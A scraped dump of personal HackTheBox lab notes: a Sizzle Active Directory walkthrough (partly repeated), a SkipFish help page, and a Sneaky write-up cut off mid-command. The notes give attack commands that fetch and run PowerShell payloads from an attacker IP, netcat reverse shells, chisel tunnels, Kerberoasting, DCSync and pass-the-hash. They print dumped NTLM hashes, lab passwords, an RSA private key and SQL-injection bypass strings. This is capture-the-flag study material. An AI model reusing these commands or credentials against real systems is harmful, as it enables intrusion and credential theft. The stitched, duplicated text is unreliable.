Net.WebClient).downloadstring('http://10.10.14.49/Invoke-PowerShellTcp2.ps1')\u0026quot;  NC shell\nThis is worse than winrm shell but better than the nishang shell. Well pivot from the nishang shell to nc.exe find a writeable directory. Then upload nc.exe threw smbclient cp it over the directory then run netcat.\n.\\nc.exe -e cmd.exe 10.10.14.49 1917 .\\nc.exe -e cmd.exe 10.10.14.49 1916  going to define sizzle ports as 1917 and 1918\nso there are four parts to setting this up one will be in the other well call out\nfirst host a server, then on the target run the client and connect back. R:port is the target port the last is the connect backport. Now We run a server on the target that connects to last port. back on our host we connect with a client to the desirder port. should be accessible form our localhost now.\n./chisel server -p 8000 --reverse -v .\\chisel.exe client 10.10.14.49:8000 R:88:127.0.0.1:1337 .\\chisel.exe server -p 1337 --socks5 ./chisel client 127.0.0.1:88 socks  .\\chisel.exe server -p 1337 --socks5 ./chisel client 127.0.0.1:88 socks  GetUserSPNs.py\n-request Domain to query if different than the fomain of the user. Allows for kerberoasting accross trusts. request -request-user Adminitrator    POWERVIEW\nthis will give the hash for mrlky. this was pretty cool finding the domain was tricking. You will find that in the nmap scans the second part is the user domain\\users. i had also mixed up the forward \u0026amp; back lashes\nnot its the same thing but when i copy and paste from my test files it doesn\u0026rsquo;t work but using tmux paste as a once liner will run this.\nIEX(New-Object Net.WebClient).downloadstring('http://10.10.14.49/powerview.ps1') $amanda = ConvertTo-SecureString 'Football#7' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\\mrlky', $amanda) Invoke-Kerberoast -Credential $cred -Verbose -Domain HTB.LOCAL | fl  hashcat\n.\\hashcat64.exe -m 13100 -a 0 kerberoast.hashes cracked.txt rockyou.txt --force  Enumerating users\nIEX(New-Object Net.WebClient).downloadstring('http://10.10.14.49/powerview.ps1') $amanda = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\\amanda', $amanda) Get-DomainUser -Credential$cred -DomainController HTB.LOCAL | select samAccountName, logoncount, lastlogon  Adminisrtator mrlky amanda  add stuff\nBLOODHONUD SHARPHOUND\nsharphound collecting the information needed. I used powershell version. but you can also use th sharphound.exe \u0026ndash;domaincontroller. im going to try and r\ngoing to try and do what we did in reel and have amanda take owner of mrlky\nSet-DomainObjectOwner -identity mrlky -OwnerIdentity amanda Add-DomainObjectAcl -TargetIdentity mrlky -PrincipalIdentity amanda -Rights ResetPassword  So mrlky has first degree group memberships to users, remote management \u0026amp; domain users.\nDomain admins has access to administrator.\nmrlky is linky to domain admin by general\nWe have something called GenericAll also known as Access Mask which grants complete control over a target object, including \u0026ldquo;control rights\u0026rdquo;. WriteDacl \u0026amp; WriteOwner priviledges, as any specific rights granted.\nGenericwrite is a combination of right_read_control right_ds_write_property, and right_ws_write_property_extended.\nwriteproperty with objecttype that doesn\u0026rsquo;t contain a guid also means that the principal has the right to modify all properties. while this case is techincally not the equivalent of generticwrite, in practice its all the same.\ni\u0026rsquo;m tired of paraphrasing\nThese generic rights can be abused with PowerView’s Set-DomainObject. The -Setparameter allows for field modification (-Set @{“property1”=”value1”;“property2”=”value2”}) while the -Clearparameter will clear a property’s value. Here’s an example of setting a target user’s servicePrincipalName, Kerberoasting the account, and resetting the servicePrincipalName:  Get-DomainUser Administrator | ConvertFrom-UACValue  Genericall group\ndomain admins group has weak permissions but bloodhound already told us it does. Lets also get the distrguished name\nCN=Domain Admins,CN=Users,DC=HTB,DC=LOCAL\n Get-NetGroup \u0026quot;domain admins\u0026quot; objectsid : S-1-5-21-2379389067-1826974543-3574127760-512 samaccounttype : GROUP_OBJECT instancetype : 4 memberof : {CN=Denied RODC Password Replication Group,CN=Users,DC=HTB,DC=LOCAL, CN=A dministrators,CN=Builtin,DC=HTB,DC=LOCAL} member : {CN=sizzler,CN=Users,DC=HTB,DC=LOCAL, CN=Administrator,CN=Users,DC=HTB,DC =LOCAL} whenchanged : 7/12/2018 2:30:00 PM name : Domain Admins admincount : 1 distinguishedname : CN=Domain Admins,CN=Users,DC=HTB,DC=LOCAL usncreated : 12345 dscorepropagationdata : {7/7/2018 5:28:35 PM, 7/2/2018 7:13:51 PM, 7/2/2018 6:58:37 PM, 1/1/1601 6:12:16 PM} cn : Domain Admins objectguid : 6b7545ba-3b4d-4ef9-bb0d-6214ce94c1fd whencreated : 7/2/2018 6:58:36 PM description : Designated administrators of the domain samaccountname : Domain Admins grouptype : GLOBAL_SCOPE, SECURITY objectcategory : CN=Group,CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL iscriticalsystemobject : True usnchanged : 53447 objectclass : {top, group}  hmmm back to blodhound appon further examination of first degree object controls i found a new vector. Getchanges thank 0xdf.\nGet-NetForestDomain Forest : HTB.LOCAL DomainControllers : {sizzle.HTB.LOCAL} Children : {} DomainMode : Parent : PdcRoleOwner : sizzle.HTB.LOCAL RidRoleOwner : sizzle.HTB.LOCAL InfrastructureRoleOwner : sizzle.HTB.LOCAL Name : HTB.LOCAL  root\nBefore you can even get user you need to pivot from amanda to mrlky\nfiguring out away to pass the hash was trying. SmbMap worked fine, smbclient didn\u0026rsquo;t do so well \u0026amp; smbclient.py in impacket worked out. Actve directory is a file management system, that adds a layer of security to windows. Allowing users to access data across a corprate enviroment. The system stores all the user keys on the domain, when a new domain controller is added the domain controller will share the keys with the new domain controller. kerbroast attack impersonates a domain controller and sends a fake connetino pretending to be a new domain asking for an update.\nSome tools i used to get to this point a couple different versions of powerview, Nishang Invoke, Invoke-dcsynv(didn\u0026rsquo;t work very well might have been me.), \u0026amp; invoke-mimikatz.\nGetChangesAll this is a type of write permission from what ive read this one can easily overloooked. Seeing this is bad.\ndcsync is an attack you can use secretsdump.py, powerview or mimikatz to exploit it takes advantage of getchangesall in this case will allow the attacker to impersonate a Domain Controler and Ask for user data =] its a feature.\nSecretsdump.py This impersonates a dc being added to the domain and request all the keys. this is taking advantage of how active directory works.\nSecretsdump does not need to be tunnelled next time i might just run this and make some guess on usernames.\npython secretsdump.py -just-dc Administrator/mrlky\\@10.10.10.103 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies Password: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3::: mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef::: sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de::: SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:ab61df127961db5a61167dd3864e72f5::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d   secretsdump.py Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies usage: secretsdump.py [-h] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM] [-ntds NTDS] [-resumefile RESUMEFILE] [-outputfile OUTPUTFILE] [-use-vss] [-exec-method [{smbexec,wmiexec,mmcexec}]] [-just-dc-user USERNAME] [-just-dc] [-just-dc-ntlm] [-pwd-last-set] [-user-status] [-history] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] target  smbclient.py\nsmbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9$ 67 10.10.10.103 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies Type help for list of commands # open 10.10.10.103 [*] SMBv3.0 dialect used # login_hash administrator aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 [*] USER Session Granted # shares ADMIN$ C$ CertEnroll Department Shares IPC$ # use c$ # cd users # cd Administrators [-] SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.) # cd administrator # dir  vable domain name [0/1707] login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes logoff - logs off shares - list available shares use {sharename} - connect to an specific share cd {path} - changes the current directory to {path} lcd {path} - changes the current local directory to {path} pwd - shows current remote directory password - changes the user password, the new password will be prompted for input ls {wildcard} - lists all the files in the current directory rm {file} - removes the selected file mkdir {dirname} - creates the directory under the current path rmdir {dirname} - removes the directory under the current path put {filename} - uploads the filename into the current path get {filename} - downloads the filename from the current path info - returns NetrServerInfo main results who - returns the sessions currently connected at the target host (admin required) close - closes the current SMB Session exit - terminates the server process (and this session)  Powerview Stuff\nAs mentioned before i had two different version of powershelli believe impacket is the way to go but make sure to check methdos \u0026amp; parameters first.\nI had initially thought i had genericall permisions which would allow me to change passwords for different user accounts. Those were transversitive permissions not direct but id sitll like to cover those attemps.\nPowerview You can preform a dcsync attack but i wasnt successful.\niex(New-Object Net.WebClient).downloadstring('http://10.10.14.49/powerview2.ps1')  $amanda = ConvertTo-SecureString 'Football#7' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\\mrlky', $amanda) Add-DomainObjectAcl -TargetIdentity Administrator -PrincipalIdentity mrlky -Rights DCsync -Credential $Cred -Verbose Get-DomainObjectACL Administrator -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $amanda } Add-DomainGroupMember -Identity 'Administrator' -Members 'mrlky' -Credential $cred  $mrlky = Get-DomainUser mrlky | Select-Object -ExpandProperty objectsid Get-DomainObjectACL Administrator -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $mrlky} Add-DomainObjectAcl -TargetIdentity Administrator -PrincipalIdentity mrlky -Rights DCsync -Verbose Get-DomainObjectACL Administrator -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $amanda }  Edited\ngenetic.config please review 0xdf giddy write up on setting this up. we just need to change somethings and set the computername as sizzle.\ntrying to get mimikatz to work pretty touch my object now is to encode mimikatz using ebowla. I ran file on the two verison of mimikatz i have aviable. ones a x86 binary the other is a x32. Ive been trying to compile the x86. spent all day today getting some other stuff to work . xD im not even going to go into the rabbit hole i went into but, ill be covering how to install \u0026amp; setup ebowla.py\nnote: locate mimi*.exe find the x64 version then copy it into Ebowla\npython ebowla.py mimikatz_x64.exe genetic.config [*] Using Symmetric encryption [*] Payload length 927384 [*] Payload_type exepyth [*] Using EXE payload template [*] Used environment variables: [-] environment value used: computername, value used: sizzle [!] Path string not used as pasrt of key [!] External IP mask NOT used as part of key [!] System time mask NOT used as part of key [*] String used to source the encryption key: sizzle [*] Applying 10000 sha512 hash iterations before encryption [*] Encryption key: 292aac24504dfa3fb72ece428be091473c5f4cb28b29e1bd4c2f5a744842ef2b [*] Writing GO payload to: go_symmetric_mimikatz_x64.exe.go  ./build_x64_go.sh output/go_symmetric_mimikatz_x64.exe.go mimikatebowx64.exe [*] Copy Files to tmp for building [*] Building... [*] Building complete [*] Copy mimikatebowx64.exe to output [*] Cleaning up [*] Done  Now, copy over the files using smbclient. then transfer the files to a writeable directory.\ncp 'c:\\Department Shares\\Users\\Public\\*' c:\\windows\\system32\\spool\\drivers\\color\\ cp 'c:\\Department Shares\\Users\\Public\\*' c:\\windows\\system32\\microsoft\\crypto\\rsa\\machinekeys  Onces everything is setup you may encounter problems like mimikatz using 8000 lines blank. mimikatcs will lets you run commands so well take advantage of that before it closes. if you scroll up those 8000 lines well find our hashes.\n.\\mimikatebowx64.exe Mimi-Command '\u0026quot;lsadump::dcsync /user:Administrator\u0026quot;'  "
},
{
	"uri": "/hackthebox/boxes/gold-sizzle/",
	"title": "Sizzle-Gold",
	"tags": [],
	"description": "",
	"content": " Nmap\n80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn't have a title (text/html).  445/tcp open microsoft-ds?  5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2019-06-03T11:45:21 |_Not valid after: 2020-06-02T11:45:21 |_ssl-date: 2019-06-03T15:07:26+00:00; -6m04s from scanner time. | tls-alpn: | h2 |_ http/1.1  WEB APPLICATION #### PHASE 1 #####\n​ Gobuster\ngobuster -w /home/htb/wordlist/seclist/Discovery/Web-Content/IIS.fuzz.txt -u http://10.10.10.103/ -t 40  Wfuzz\nwfuzz --hc 404 -c -w /home/htb/wordlist/seclist/Discovery/Web-Content/IIS.fuzz.txt \u0026quot;http://sizzle.htb/FUZZ\u0026quot;  SIZZLE.HTB/CERTSRV\nSMB ENUMERATION #### PHASE2 ##### SMB - here we will find that the shares are not writeable. That the directories subfolder are writeable. that when a share is listed as READ ONLY that is refereeing tot he share itself. That doesn\u0026rsquo;t mean the shares aren\u0026rsquo;t writeable. Writing a simple bash script to enumerate the shares. then droping a scf file that will contect back to our host. Responder will collect the users ntlm hash.\nSMB) FOO\nsmbmap -H 10.10.10.103 smbclient -N -L //10.10.10.103  Mounting the Share locally \u0026amp; FOR LOOP TOUCH ALL YOU OVER\nHow this trick works is we will see the script produce permission denied errors and compare the denied errors to the shares the ones that don\u0026rsquo;t ahve the error are writeable.\nmount -o user=guest '//10.10.15.105/Department Shares' /mnt/sizzle  #!/bin/bash for folder in /mnt/sizzle/**/*; do touch \u0026quot;$folder\u0026quot;;done  SCF ## shell command file performs a limited set of windows explorer commands. opening windows explorer or showing the desktop. one of the functions of this file is you can pull the icon image from the internet. whenever the file is browsed it will connect back to a smb our smb-server.\ncopy the scf file over to \u0026lsquo;department shares\u0026rsquo;\\public\\, then setup responder like below.\nreferences  https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/ https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/  [Shell] Command=2 IconFile=\\\\CHANGE ME\\pie.ico [Tashbar] Command=ToggleDesktop  Responder\nresponder -I tun0 -e 10.10.10.103  HASHCAT / john sucks\nWhen saving the hashes in notepad be sure to encode using ANSI or you will get a bit error. modules 5600 for ntlm hashes using rock you shouldn\u0026rsquo;t take long.\n .\\hashcat64.exe -m 13100 .\\mrlky.hashes .\\rockyou.txt .\\hashcat64.exe -m 13100 .\\mrlky.hashes .\\rockyou.txt --show  MYCA ### PHASE 3### We will login as amanda and get the certificate authority and use openssll to sign some certs and login using winrm. Editing a winrm script to use certs.\nreference\n https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb  Microsoft Active Directory Certificate Services\nprovides a web platform for issueing anad managing public keys infrastructure or pki certificates. When you logon as a valid user if will issue you a cert of any kind a CA or public key.\nOPENSSL making the ssl certs. this creates two distinct files.\nopenssl pkcs12 -in amanda.p12 -nocerts -out amanda.key openssl pkcs12 -in amanda.p12 -clcerts -nokey -out amanda.crt  CHANGES MADE TO WINRM RUBY\nI’m not sure why the my connection kept closing and i had to retype the darn passphrase hundreds of times. So i went looking for away to fix this annonyans. key_pass was the solution.\nruby script.rb  http://paste.openstack.org/show/197184/\nconn = WinRM::Connection.new( endpoint: 'https://10.10.10.103:5986/wsman', transport: :ssl, client_cert: 'amanda_crt.pem', client_key: 'amanda_key.pem', key_pass: 'Ashare1972', # user: 'amanda' # password: 'Ashare1972', :no_ssl_peer_verification =\u0026gt; true )  CLM / CHISEL TUNNELS ##### PHASE 4 #####\nFirst we will bypass constrained language mode. then move chisel over using invoke web request. Explore some windows directories that have write and execute permissions.\nThis command is used to find out if you are in a clm\n$ExecutionContext.SessionState.LanguageMode  Next we need to understand the .net frameworks in place. version to has a bypass we can use powershell2.\nreg query \u0026quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\u0026quot;  PowerShell -Version 2 -ExecutionPolicy ByPass -command \u0026quot;command here\u0026quot;  Now setup python simple http server. we will using a nishang shell to bypass clm. this should land you in a shell without clm. next upload chisel, setup a chisel proxy allowing us to access port 88 which on the localhost.\n https://github.com/samratashok/nishang/tree/master/Shells https://github.com/jpillora/chisel  python3 -m http.server 80 nc -lvnp portNUmbers  PowerShell -Version 2 -ExecutionPolicy ByPass -command \u0026quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.49/Invoke-PowerShellTcp.ps1')\u0026quot;  powershell iwr \u0026quot;http://10.10.15.105/chisel.exe\u0026quot; -outfile chisel.exe  Setting up the chisel servers \u0026amp; clients there are handful ways to setup the chisel proxy. The first is overly complex will requirer multiple shells to do. the second is simpler and the last is darn simple. setting up the server is the easiest part.\n1)\n./chisel server -p 8000 --reverse -v .\\chisel.exe client 10.10.14.49:8000 R:88:127.0.0.1:1337 .\\chisel.exe server -p 1337 --socks5 ./chisel client 127.0.0.1:88 socks  2)\n.\\chisel.exe client 10.10.14.49:8000 R:88:127.0.0.1:88 R:389:localhost:389  3)\n.\\chisel.exe client 10.10.15.105:8000 R:127.0.0.1:8001:localhost:88\t server) ## -v is important\n./chisel server -port 8000 --reverse -v  The finale part for this phase is collecting mrlky kerb hashes. using GetUserSPNs.py which can be found in IMPACKET ON KALI locate getuserspns.py. getuserspns.py just hangs. smb wont work if there is a huge time difference between the two host \u0026amp; client.\nlinux uses military time so 10pm is 22 when chaning the time.\n GetUserSPNs.py -request -dc-ip 10.10.10.103 sizzle.htb/amanda -save -outputfile GetUserSPNs.out  victim Saturday, June 8, 2019 10:16:04 PM kali\tSat 08 Jun 2019 10:21:24 PM EDT date +%T -s \u0026quot;windowstime\u0026quot;  ./GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out w  HASHCAT - Kerberos 5\nThis didn\u0026rsquo;t take that long to brute force luckily. be sure to save the file in ANIS. Using 13100\n.\\hashcat64.exe -m 13100 .\\mrlky.hashes .\\rockyou.txt .\\hashcat64.exe -m 13100 .\\mrlky.hashes .\\rockyou.txt --show Football#7  WEBAPP AGAIN MRLKY MYCA #### PHASE 5 #####\nNeed to repeat phase3, reset the browser cookies or open a private windows. login as mrlky, then generate the cert. use openssl to generate our own certs. name everything differently or make different directories dont want a cluttered worksite.\ncreds mrlky | Football#7  openssl pkcs12 -in mrlky.p12 -nocerts -out mrlky.key openssl pkcs12 -in mrlky.p12 -clcerts -nokeys -out mrlky.crt  changing the names of cert and key in winrm\nMIMIKATZ ##### PHASE 6 ######\ngenetic.config please review 0xdf giddy write up on setting this up. we just need to change somethings and set the computername as sizzle.\ntrying to get mimikatz to work pretty touch my object now is to encode mimikatz using ebowla. I ran file on the two verison of mimikatz i have aviable. ones a x86 binary the other is a x32. Ive been trying to compile the x86. spent all day today getting some other stuff to work . xD im not even going to go into the rabbit hole i went into but, ill be covering how to install \u0026amp; setup ebowla.py\nnote: locate mimi*.exe find the x64 version then copy it into Ebowla\npython ebowla.py mimikatz_x64.exe genetic.config [*] Using Symmetric encryption [*] Payload length 927384 [*] Payload_type exepyth [*] Using EXE payload template [*] Used environment variables: [-] environment value used: computername, value used: sizzle [!] Path string not used as pasrt of key [!] External IP mask NOT used as part of key [!] System time mask NOT used as part of key [*] String used to source the encryption key: sizzle [*] Applying 10000 sha512 hash iterations before encryption [*] Encryption key: 292aac24504dfa3fb72ece428be091473c5f4cb28b29e1bd4c2f5a744842ef2b [*] Writing GO payload to: go_symmetric_mimikatz_x64.exe.go  ./build_x64_go.sh output/go_symmetric_mimikatz_x64.exe.go mimikatebowx64.exe [*] Copy Files to tmp for building [*] Building... [*] Building complete [*] Copy mimikatebowx64.exe to output [*] Cleaning up [*] Done  Now, copy over the files using smbclient. then transfer the files to a writeable directory.\ncd c:\\windows\\system32\\microsoft\\crypto\\rsa\\machinekeys\\ cd c:\\Windows\\System32\\spool\\drivers\\color\\  Onces everything is setup you may encounter problems like mimikatz using 8000 lines blank. mimikatcs will lets you run commands so well take advantage of that before it closes. if you scroll up those 8000 lines well find our hashes.\npowershell iwr http://10.10.15.105/mimikatebowx64.exe -outfile pinkie.exe  .\\pinkie.exe Mimi-Command '\u0026quot;lsadump::dcsync /user:Administrator\u0026quot;'  NTML-HASH pAsSThEHaSh\ncrackmapexec 10.10.10.103 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267  pth-winexe -U aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 //10.10.10.103 cmd.exe  python wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103  smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:40c426273013ae36c8f2e329f35f25fe 10.10.10.103  "
},
{
	"uri": "/webapp/skipfish/",
	"title": "SkipFish",
	"tags": [],
	"description": "",
	"content": "SkipFish is a web app directory scanner that creates a neat report. it will recursively scan a web app and will look for ill regularities.\nskipfish -h [39/484] skipfish web application scanner - version 2.10b Usage: skipfish [ options ... ] -W wordlist -o output_dir start_url [ start_url2 ... ] Authentication and access options: -A user:pass - use specified HTTP authentication credentials -F host=IP - pretend that 'host' resolves to 'IP' -C name=val - append a custom cookie to all requests -H name=val - append a custom HTTP header to all requests -b (i|f|p) - use headers consistent with MSIE / Firefox / iPhone -N - do not accept any new cookies --auth-form url - form authentication URL --auth-user user - form authentication user --auth-pass pass - form authentication password --auth-verify-url - URL for in-session detection Crawl scope options: -d max_depth - maximum crawl tree depth (16) -c max_child - maximum children to index per node (512) -x max_desc - maximum descendants to index per branch (8192) -r r_limit - max total number of requests to send (100000000) -p crawl% - node and link crawl probability (100%) -q hex - repeat probabilistic scan with given seed -I string - only follow URLs matching 'string' -X string - exclude URLs matching 'string' -K string - do not fuzz parameters named 'string' -D domain - crawl cross-site links to another domain -B domain - trust, but do not crawl, another domain -Z - do not descend into 5xx locations -O - do not submit any forms -P - do not parse HTML, etc, to find new links Reporting options: -o dir - write output to specified directory (required) -M - log warnings about mixed content / non-SSL passwords -E - log all HTTP/1.0 / HTTP/1.1 caching intent mismatches -U - log all external URLs and e-mails seen -Q - completely suppress duplicate nodes in reports -u - be quiet, disable realtime progress stats -v - enable runtime logging (to stderr) Dictionary management options: -W wordlist - use a specified read-write wordlist (required) -S wordlist - load a supplemental read-only wordlist -L - do not auto-learn new keywords for the site -Y - do not fuzz extensions in directory brute-force -R age - purge words hit more than 'age' scans ago -T name=val - add new form auto-fill rule -G max_guess - maximum number of keyword guesses to keep (256) -z sigfile - load signatures from this file Performance settings: -g max_conn - max simultaneous TCP connections, global (40) -m host_conn - max simultaneous connections, per target IP (10) -f max_fail - max number of consecutive HTTP errors (100) -t req_tmout - total request response timeout (20 s) -w rw_tmout - individual network I/O timeout (10 s) -i idle_tmout - timeout on idle HTTP connections (10 s) -s s_limit - response size limit (400000 B) -e - do not keep binary responses for reporting Other settings: -l max_req - max requests per second (0.000000) -k duration - stop scanning after the given duration h:m:s --config file - load the specified configuration file Send comments and complaints to \u0026lt;heinenn@google.com\u0026gt;.  https://tools.kali.org/web-applications/skipfish\n"
},
{
	"uri": "/hackthebox/boxes/sneaky/",
	"title": "Sneaky",
	"tags": [],
	"description": "",
	"content": "The goal of this guide since ill be using other guides to solve it will be to learn as much as possible. There are two open ports, 80 \u0026amp; 161 on udp snmp. The webpage is under development, with a web directory that hides some content.\nnmap -sT -Pn -T5 -oA nmap/initial 10.10.10.60 -sT full tcp connection three way handshake -Pn treat ports as if they are open -T5 super speed ### 80 ### nmap -sU --top-port 1000 -oA nmap/udp 10.10.10.60 -sU scan udp ports --top-ports to scan ### 161 ###  GOBUSTER Nothing special\n/opt/gobuster/gobuster dir -w /usr/share/wordlists/dirbuster/dirctory-list-2.3-small.txt -t 200 -u http://10.10.10.20  DEV\n​ In the dev directory find login.php. One thing to test for if bruteforcing fails is sql injections. could probably test for it while brute forcing to make sure. sqlmap is a great tool to use to test for sql injection. Memorizing basic sql injection is on my to do list.\nI suppose one could just fuzz sql injectio with wfuzz, taking a list of characters and testing the response.\nkind of wana see all the things that we could fuzz that would yield a valid login. ippsec used \u0026rsquo; OR \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1 the HTB guide used \u0026rsquo; OR 1=1;\u0026ndash; there is a sql param list in seclist.\nhttps://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/\nhttp://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet\nhttps://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html\nUSER thrasivoulos\nmove this over to the localhost and chmod 600 the file thrasivoulos.pem\n-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5 Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr 3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb yDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn cb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa Nyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB JkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz 5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym +jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu 7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC GR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x hxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd 1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/ Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31 rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb -----END RSA PRIVATE KEY-----  SNMP-WALK\nLol tried to login to ssh with the creds and cert but totally forgot that doesn\u0026rsquo;t matter because the ports clossed. ran a more detailed scan using nmap on snmp 161 it gave a crap load of detail. Also my post about snmpwalk was really helpful figuring out what to do. https://chickenpwny.github.io/linux/snmpwalk/ we got the ipv6 address score!!\nsnmpwalk -c public -v2c 10.10.10.20 ipAddressTable \u0026gt; iptables  notice the ipv6 address doesn\u0026rsquo;t look like a ipv6 address to many colons.\nde:ad:be:ef:00:00:00:00:02:50:56:ff:fe:8f:0b:58  So, we have to make some changes to the address provided by snmpwalk. There some vim foo you can use to edit make it easier. using Q \u0026amp; A try and get the above ipv6 address to look like the bottom. One string of Zero\u0026rsquo;s may be removed and the total amount of segments is 7\ndead:beef:0000:0000:0250:56ff:fe8f:0b58 dead:beef::0250:56ff:fe8f:0b58   man ssh | grep 6 XD i tried using  -h \u0026ndash;help nothing but man had the info i need. there is a small 6 in help page.  -6 Forces ssh to use IPv6 addresses only.\nssh -6 thrasivoulos@dead:beef::0250:56ff:fe8f:0b58 -i thrasivoulos.pub  USER.TXT\n​ Yay, we have user. where to from here what to do i have not done much enumeration, found some credentials inside mysql_history. I wasn\u0026rsquo;t really sure where to go with this so went to the guide\u0026rsquo;s We\u0026rsquo;re suppose to figure out via native or lineum.sh that there is a suid binary with elevated privilege\u0026rsquo;s.\nUsing the FIND Cmd to locate suid binaries. The perm could be changed to other values to search for other file permissions.\nwe find /usr/local/bin/chal\nfind / -perm +4000 